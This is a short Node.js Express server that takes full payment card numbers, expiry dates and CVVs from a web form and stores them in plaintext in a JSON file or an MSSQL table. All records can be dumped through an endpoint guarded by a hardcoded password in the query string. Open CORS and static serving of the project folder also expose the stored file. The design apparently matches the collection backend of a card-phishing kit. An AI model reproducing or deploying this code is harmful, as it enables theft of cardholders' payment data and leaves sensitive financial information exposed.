const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

// optional MSSQL support
let useDb = process.env.USE_DB === 'true';
let sql;
let dbConfig;
if (useDb) {
    sql = require('mssql');
    // adjust credentials as needed or use env vars
    dbConfig = {
        user: process.env.DB_USER || 'sa',
        password: process.env.DB_PASS || 'your_password',
        server: process.env.DB_SERVER || 'localhost',
        database: process.env.DB_NAME || 'BankData',
        options: { trustServerCertificate: true }
    };
}

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'data.json');

app.use(cors());
app.use(express.json());

// file-based helpers
function readDataFile() {
    try {
        const content = fs.readFileSync(DATA_FILE, 'utf8');
        return JSON.parse(content);
    } catch (e) {
        return [];
    }
}

function writeDataFile(data) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// database helpers
async function addEntryDb(entry) {
    await sql.connect(dbConfig);
    const { cardNumber, expiry, cvv } = entry;
    await sql.query`INSERT INTO Cards (CardNumber, Expiry, Cvv) VALUES (${cardNumber}, ${expiry}, ${cvv})`;
}

async function getEntriesDb() {
    await sql.connect(dbConfig);
    const result = await sql.query`SELECT * FROM Cards ORDER BY Id`;
    return result.recordset;
}

// Accept card submissions
app.post('/submit', async (req, res) => {
    const { cardNumber, expiry, cvv } = req.body;
    if (!cardNumber || !expiry || !cvv) {
        return res.status(400).json({ error: 'Missing fields' });
    }
    const entry = { cardNumber, expiry, cvv, timestamp: new Date().toISOString() };
    try {
        if (useDb) {
            await addEntryDb(entry);
        } else {
            const existing = readDataFile();
            existing.push(entry);
            writeDataFile(existing);
        }
        res.json({ status: 'ok' });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'Server error' });
    }
});

// Provide stored data, protected by password
const PASSWORD = '27032011';
app.get('/data', async (req, res) => {
    const pass = req.query.pass;
    if (pass !== PASSWORD) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    try {
        if (useDb) {
            const rows = await getEntriesDb();
            res.json(rows);
        } else {
            res.json(readDataFile());
        }
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'Server error' });
    }
});

// Serve static client files
app.use(express.static(path.join(__dirname)));

app.listen(PORT, () => {
    console.log(`Server listening on http://localhost:${PORT}`);
    if (useDb) console.log('Using database backend');
});
